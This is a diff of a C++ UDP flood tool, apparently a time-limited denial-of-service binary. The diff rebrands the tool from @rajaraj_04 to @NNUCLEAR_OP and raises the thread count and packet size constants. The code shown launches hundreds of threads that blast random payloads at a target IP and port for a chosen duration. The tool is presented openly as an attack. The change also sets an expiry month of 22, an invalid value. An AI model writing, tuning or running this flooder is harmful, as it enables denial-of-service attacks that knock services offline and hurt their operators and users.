@@ -1,68 +1,68 @@
-#include <iostream>//#THIS FILE OWNER IS @rajaraj_04
+#include <iostream>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <cstring>//#THIS FILE OWNER IS @rajaraj_04
+#include <cstring>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <cstdlib>//#THIS FILE OWNER IS @rajaraj_04
+#include <cstdlib>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <ctime>//#THIS FILE OWNER IS @rajaraj_04
+#include <ctime>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <netinet/in.h>//#THIS FILE OWNER IS @rajaraj_04
+#include <netinet/in.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <arpa/inet.h>//#THIS FILE OWNER IS @rajaraj_04
+#include <arpa/inet.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <unistd.h>//#THIS FILE OWNER IS @rajaraj_04
+#include <unistd.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <sys/socket.h>//#THIS FILE OWNER IS @rajaraj_04
+#include <sys/socket.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <sys/types.h>//#THIS FILE OWNER IS @rajaraj_04
+#include <sys/types.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <vector>//#THIS FILE OWNER IS @rajaraj_04
+#include <vector>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <thread>//#THIS FILE OWNER IS @rajaraj_04
+#include <thread>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-#include <mutex>//#THIS FILE OWNER IS @rajaraj_04
-
-
-#define PACKET_SIZE 9999  //#THIS FILE OWNER IS @rajaraj_04
-
-#define PAYLOAD_SIZE 1400  ////#THIS FILE OWNER IS @rajaraj_04
-
-//#THIS FILE OWNER IS @rajaraj_04
-
-const int EXPIRY_DAY = 20;//#THIS FILE OWNER IS @rajaraj_04
-
-const int EXPIRY_MONTH = 12;  // //#THIS FILE OWNER IS @rajaraj_04
-
-const int EXPIRY_YEAR = 2026;//#THIS FILE OWNER IS @rajaraj_04
+#include <mutex>//#THIS FILE OWNER IS @NNUCLEAR_OP
 
 
-//#THIS FILE OWNER IS @rajaraj_04
+#define PACKET_SIZE 9999999  //#THIS FILE OWNER IS @NNUCLEAR_OP
 
-const int DEFAULT_THREAD_COUNT = 500;//#THIS FILE OWNER IS @rajaraj_04
+#define PAYLOAD_SIZE 1400  ////#THIS FILE OWNER IS @NNUCLEAR_OP
+
+//#THIS FILE OWNER IS @NNUCLEAR_OP
+
+const int EXPIRY_DAY = 30;//#THIS FILE OWNER IS @NNUCLEAR_OP
+
+const int EXPIRY_MONTH = 22;  // //#THIS FILE OWNER IS @NNUCLEAR_OP
+
+const int EXPIRY_YEAR = 2026;//#THIS FILE OWNER IS @NNUCLEAR_OP
 
 
-//#THIS FILE OWNER IS @rajaraj_04
+//#THIS FILE OWNER IS @NNUCLEAR_OP
+
+const int DEFAULT_THREAD_COUNT = 800;//#THIS FILE OWNER IS @NNUCLEAR_OP
+
+
+//#THIS FILE OWNER IS @NNUCLEAR_OP
 
 std::mutex log_mutex;
 
 // Function to generate a random payload for UDP packets
 void generate_payload(char *buffer, size_t size) {
-    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";//#THIS FILE OWNER IS @rajaraj_04
+    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";//#THIS FILE OWNER IS @NNUCLEAR_OP
 
     for (size_t i = 0; i < size; ++i) {
         buffer[i] = charset[rand() % (sizeof(charset) - 1)];
     }
 }
 
-//#THIS FILE OWNER IS @rajaraj_04
+//#THIS FILE OWNER IS @NNUCLEAR_OP
 
 bool is_binary_expired() {
     time_t now = time(nullptr);
     struct tm *current_time = localtime(&now);
 
-    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||//#THIS FILE OWNER IS @rajaraj_04
+    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||//#THIS FILE OWNER IS @NNUCLEAR_OP
 
-        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||//#THIS FILE OWNER IS @rajaraj_04
+        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||//#THIS FILE OWNER IS @NNUCLEAR_OP
 
         (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
          current_time->tm_mday > EXPIRY_DAY)) {
@@ -71,7 +71,7 @@ bool is_binary_expired() {
     return false;
 }
 
-//#THIS FILE OWNER IS @rajaraj_04
+//#THIS FILE OWNER IS @NNUCLEAR_OP
 
 void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
     sockaddr_in server_addr{};
@@ -85,7 +85,7 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
         return;
     }
 
-  //#THIS FILE OWNER IS @rajaraj_04
+  //#THIS FILE OWNER IS @NNUCLEAR_OP
 
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(port);
@@ -96,11 +96,11 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
         return;
     }
 
-    //#THIS FILE OWNER IS @rajaraj_04
+    //#THIS FILE OWNER IS @NNUCLEAR_OP
 
     generate_payload(buffer, PAYLOAD_SIZE);
 
-    //#THIS FILE OWNER IS @rajaraj_04
+    //#THIS FILE OWNER IS @NNUCLEAR_OP
 
     time_t start_time = time(nullptr);
     while (time(nullptr) - start_time < attack_time) {
@@ -120,7 +120,7 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
 void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
     std::vector<std::thread> threads;
 
-    std::cout << "LAUNCHING MULTI-THREADED UDP FLOOD ATTACK WITH @rajaraj_04" << thread_count << " threads..." << std::endl;
+    std::cout << "LAUNCHING MULTI-THREADED UDP FLOOD ATTACK WITH @NNUCLEAR_OP" << thread_count << " threads..." << std::endl;
 
     // Create and start threads
     for (int i = 0; i < thread_count; ++i) {
@@ -134,7 +134,7 @@ void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int th
         }
     }
 
-    std::cout << "MULTI-THREADED ATTACK COMPLETED.OWNER:- @rajaraj_04" << std::endl;
+    std::cout << "MULTI-THREADED ATTACK COMPLETED.OWNER:- @NNUCLEAR_OP" << std::endl;
 }
 
 // Function to get the number of threads from the command line arguments or use a default value
@@ -158,12 +158,12 @@ int main(int argc, char *argv[]) {
 
     // Check if the binary has expired
     if (is_binary_expired()) {
-        std::cerr << "ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER @rajaraj_04." << std::endl;
+        std::cerr << "ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER @NNUCLEAR_OP." << std::endl;
         return EXIT_FAILURE;
-    } //#THIS FILE OWNER IS @rajaraj_04
+    } //#THIS FILE OWNER IS @NNUCLEAR_OP
 
     // Perform the multi-threaded attack
     multi_threaded_udp_attack(ip, port, duration, thread_count);
 
     return EXIT_SUCCESS;
-} //#THIS FILE OWNER IS @rajaraj_04
+} //#THIS FILE OWNER IS @NNUCLEAR_OP
